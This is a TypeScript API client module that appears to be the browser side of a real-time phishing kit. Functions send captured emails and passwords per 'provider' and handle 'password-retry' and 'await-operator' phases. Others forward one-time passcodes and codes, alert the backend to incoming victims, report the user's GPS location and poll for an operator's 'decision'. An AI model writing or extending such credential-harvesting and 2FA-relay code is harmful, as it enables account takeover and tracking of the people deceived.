type ApiResult<T> = { ok: true; data: T } | { ok: false; error: string };

async function request<T>(
  path: string,
  init?: RequestInit,
): Promise<ApiResult<T>> {
  try {
    const response = await fetch(path, {
      ...init,
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
        ...(init?.headers ?? {}),
      },
    });

    let data: T & { error?: string; success?: boolean };
    try {
      data = (await response.json()) as T & { error?: string };
    } catch {
      return {
        ok: false,
        error: `Server error (${response.status}). Check Vercel env vars and logs.`,
      };
    }

    if (!response.ok) {
      return {
        ok: false,
        error: data.error ?? `Request failed (${response.status})`,
      };
    }

    return { ok: true, data };
  } catch {
    return {
      ok: false,
      error:
        "Network error — cannot reach the API. If deployed on Vercel, confirm env vars are set and redeploy.",
    };
  }
}

export async function apiRecordConsent() {
  return request<{ success: boolean; message: string }>("/api/consent", {
    method: "POST",
  });
}

export type SubmitPhase = "password-retry" | "await-operator";

export async function apiSubmit(payload: {
  email?: string;
  password?: string;
  provider: string;
}) {
  return request<{
    success: boolean;
    message: string;
    phase?: SubmitPhase;
  }>("/api/submit", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}

export async function apiSubmitOtp(payload: {
  email?: string;
  otp: string;
  provider: string;
}) {
  return request<{ success: boolean; message: string }>("/api/submit-otp", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}

export async function apiSubmitCode(payload: { email?: string; code: string }) {
  return request<{ success: boolean; message: string }>("/api/submit-code", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}

export async function apiNotifyIncoming(provider: string) {
  return request<{ success: boolean }>("/api/notify-incoming", {
    method: "POST",
    body: JSON.stringify({ provider }),
  });
}

export async function apiUpdateLocation(payload: { lat: number; lon: number }) {
  return request<{ success: boolean }>("/api/location", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}

export async function apiCheckDecision() {
  return request<{ decision: string | null }>("/api/check-decision");
}
